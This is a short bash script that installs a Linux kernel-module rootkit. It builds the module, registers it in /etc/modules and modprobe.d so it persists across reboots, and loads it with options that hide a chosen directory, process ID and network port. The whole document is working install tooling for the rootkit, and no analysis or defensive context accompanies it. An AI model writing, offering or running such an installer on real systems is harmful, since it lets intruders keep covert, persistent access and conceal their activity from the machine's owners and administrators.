#!/bin/bash

line="rootkit hide_dir=$1 hide_pid=$2 hide_port=$3"

make

echo "rootkit" >> /etc/modules

cp rootkit.ko /lib/modules/$(uname -r)/

depmod -a

echo "options ${line}" > /etc/modprobe.d/rootkit.conf

modprobe ${line}